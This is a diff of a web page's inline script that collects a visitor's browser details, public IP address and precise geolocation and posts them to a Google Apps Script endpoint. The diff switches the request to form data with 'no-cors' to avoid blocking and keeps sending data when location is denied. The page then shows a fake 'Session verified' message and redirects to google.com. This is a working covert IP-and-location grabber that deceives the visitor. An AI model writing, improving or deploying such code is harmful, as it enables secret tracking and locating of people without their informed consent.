@@ -11,19 +11,18 @@
     const data = {
       userAgent: navigator.userAgent,
       platform: navigator.platform,
-      language: navigator.language,
       screenWidth: screen.width,
       screenHeight: screen.height,
       referrer: document.referrer
     };
 
-    // Get public IP
+    // Get public IP first
     fetch("https://api.ipify.org?format=json")
       .then(res => res.json())
       .then(ipData => {
         data.ip = ipData.ip;
 
-        // Get location (if allowed)
+        // Then get location
         navigator.geolocation.getCurrentPosition(
           function (pos) {
             data.latitude = pos.coords.latitude;
@@ -32,24 +31,29 @@
             sendData();
           },
           function (err) {
-            data.locationError = err.message;
-            sendData();
+            data.latitude = '';
+            data.longitude = '';
+            data.accuracy = '';
+            sendData(); // Still send data
           }
         );
       });
 
     function sendData() {
+      const formData = new URLSearchParams();
+      for (let key in data) {
+        formData.append(key, data[key]);
+      }
+
       fetch("https://script.google.com/macros/s/AKfycbwYndUfgsQIqSSZedH-y9GZCaBSMEg7eVNxxUrHz1S3f4MvNN_PUW-nYwochdNX9NSX/exec", {
         method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify(data)
+        body: formData,
+        mode: "no-cors" // Prevents CORS blocking
       });
 
       document.body.innerHTML = "<h3>✅ Session verified. Redirecting...</h3>";
       setTimeout(() => {
-        window.location.href = "https://www.google.com"; // Safe redirect
+        window.location.href = "https://www.google.com";
       }, 2000);
     }
   </script>
